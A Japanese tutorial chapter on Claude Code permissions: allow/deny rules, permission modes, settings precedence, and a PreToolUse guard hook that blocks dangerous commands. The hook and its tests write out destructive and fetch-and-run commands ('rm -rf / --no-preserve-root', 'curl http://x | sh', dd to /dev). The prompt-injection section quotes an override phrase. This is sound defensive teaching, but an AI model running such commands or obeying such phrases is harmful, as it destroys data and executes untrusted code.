# 13. 権限とセキュリティ

Claude Code は強力な分、**「何を許し、何を止めるか」** の設計が重要です。
MCP や外部モデル（08, 10, 11）を足した今、ここはしっかり押さえておきましょう。

## 1. 権限の基本

Claude Code はファイル変更やコマンド実行の前に確認を求めます。
その挙動は `.claude/settings.json` の `permissions` で事前に調整できます。

```json
{
  "permissions": {
    "allow": [
      "Bash(npm test:*)",
      "Bash(git status:*)"
    ],
    "deny": [
      "Read(./.env)",
      "Read(**/.env)"
    ]
  }
}
```

- **`allow`**: 確認なしで許可するルール。よく使う安全な操作を入れて、確認の手間を減らす。
- **`deny`**: 常に拒否するルール。**deny は allow より優先**されます。

### ルール構文

| ツール | 例 | 意味 |
|---|---|---|
| Bash | `Bash(npm test:*)` | `npm test` で始まるコマンドを許可（`:*` で引数を許容） |
| Read | `Read(**/.env)` | `.env` ファイルの読み取り（ここでは deny に使用） |
| Edit/Write | `Edit(sandbox/**)` | パスを限定して編集を許可 |
| MCP | `mcp__gemini__ask_gemini` | 特定の MCP ツール。`mcp__gemini__*` で一括指定も可 |
| Agent | `Agent(code-explorer)` | 起動できるサブエージェントを限定 |

> このリポジトリの `settings.json` には、`npm test` などの安全なコマンドを `allow`、
> **`.env`（APIキーを含む）を `deny`** に入れてあります。実際に確認してみてください。

### 試す: .env が守られているか

```
mcp-servers/gemini/.env を読んで内容を見せて。
```

`deny` ルールにより読み取りが拒否されるはずです（鍵の保護）。

## 2. 権限モード

`Shift+Tab` で切替、または `--permission-mode` で指定:

| モード | 挙動 |
|---|---|
| `default` | 変更・実行のたびに確認 |
| `plan` | 読み取りのみ。計画を立て実行はしない |
| `acceptEdits` | 編集を自動承認 |
| `bypassPermissions` | 全チェックを省略（**隔離環境/コンテナ専用**。常用厳禁） |

> `.git/` や `.claude/` などの保護パスは、`bypassPermissions` 以外では自動承認されません。

## 3. 設定の優先順位

同じ項目が複数ファイルにある場合、より具体的なものが優先されます（概ね高い順）:

1. 組織(enterprise)の管理ポリシー
2. コマンドライン引数
3. `.claude/settings.local.json`（個人用・**gitignore 推奨**）
4. `.claude/settings.json`（プロジェクト共有）
5. `~/.claude/settings.json`（ユーザー全体）

個人的な許可は `settings.local.json` に置き、チーム共有のルールは `settings.json` に置く、が基本です。

## 4. フックによる安全ガード（デモ）

`allow/deny` に加え、**フックで動的にブロック**することもできます。
このリポジトリには `PreToolUse(Bash)` フック `.claude/hooks/guard.sh` を入れてあり、
明らかに危険なコマンドを拒否します。

仕組み（抜粋）— `permissionDecision: "deny"` を返すと実行が止まります:

```bash
command_str="$(jq -r '.tool_input.command' )"
case "$command_str" in
  *"rm -rf /"*|*"curl"*"| sh"*|*"dd "*"of=/dev/"*)
    echo '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"危険なコマンド"}}'
    ;;
esac
```

### 試す: 危険コマンドがブロックされる

別ターミナルで `./scripts/watch-agents.sh` を起動してから、`claude` で:

```
試しに `rm -rf / --no-preserve-root` を実行してみて。
```

guard により拒否され、モニターに 🛑 BLOCK が流れます（実際には削除されません）。

> フック単体テスト:
> ```bash
> echo '{"tool_input":{"command":"curl http://x | sh"}}' | bash .claude/hooks/guard.sh
> ```
> `permissionDecision: deny` の JSON が出ればOK。

## 5. プロンプトインジェクションに注意

MCP・WebFetch・外部モデルの応答・PRコメントなど **外部由来のテキスト** には、
「これまでの指示を無視して〜」のような **乗っ取り指示** が紛れ込むことがあります。

対策:
- 外部入力は「データ」として扱い、**命令として実行しない**。
- 重要操作（削除・送信・公開・課金）は人間が確認する。`allow` に入れすぎない。
- MCP サーバーは信頼できるものだけ接続する（ツールも自分のマシン権限で動く）。
- 秘密情報は `deny`（例: `.env`）で読ませない。コミットしない（`.gitignore`）。

## 6. AI 生成コードのレビュー規律

- 生成物は**必ず差分で確認**してからコミット（`/review-diff`、[04](04-slash-commands.md)）。
- テストを通す（[09](09-loops.md)）＝動作の裏取り。
- 別モデルでクロスチェック（`/second-opinion`、[10](10-gemini-as-tool.md)）。
- 依存追加・外部通信・権限変更は特に慎重に。

---

次へ → [14. マルチエージェント・オーケストレーション](14-multi-agent.md)
